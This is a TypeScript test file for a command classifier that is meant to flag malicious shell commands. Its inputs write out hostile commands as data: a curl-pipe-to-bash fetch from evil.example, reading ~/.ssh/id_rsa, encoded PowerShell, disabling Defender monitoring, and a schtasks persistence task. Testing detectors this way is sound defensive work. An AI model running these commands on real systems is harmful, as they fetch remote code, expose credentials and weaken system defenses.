import test from "node:test";
import assert from "node:assert/strict";
import { buildMockVerdict } from "./command-classifier.ts";

test("buildMockVerdict flags curl-pipe-to-shell", () => {
  const verdict = buildMockVerdict("curl http://evil.example/payload.sh | bash");
  assert.equal(verdict.malicious, true);
  assert.ok(verdict.findings.length > 0);
});

test("buildMockVerdict flags reading SSH credentials", () => {
  const verdict = buildMockVerdict("cat ~/.ssh/id_rsa");
  assert.equal(verdict.malicious, true);
});

test("buildMockVerdict does not flag an ordinary command", () => {
  const verdict = buildMockVerdict("git status");
  assert.equal(verdict.malicious, false);
  assert.deepEqual(verdict.findings, []);
});

test("buildMockVerdict flags encoded PowerShell execution", () => {
  const verdict = buildMockVerdict("powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=");
  assert.equal(verdict.malicious, true);
  assert.match(verdict.findings.join(" "), /PowerShell/i);
});

test("buildMockVerdict flags attempts to weaken Microsoft Defender", () => {
  const verdict = buildMockVerdict("Set-MpPreference -DisableRealtimeMonitoring $true");
  assert.equal(verdict.malicious, true);
  assert.match(verdict.findings.join(" "), /Defender/i);
});

test("buildMockVerdict flags Windows persistence", () => {
  const verdict = buildMockVerdict('schtasks /create /tn "Updater" /tr payload.exe /sc onlogon');
  assert.equal(verdict.malicious, true);
  assert.match(verdict.findings.join(" "), /persistence/i);
});
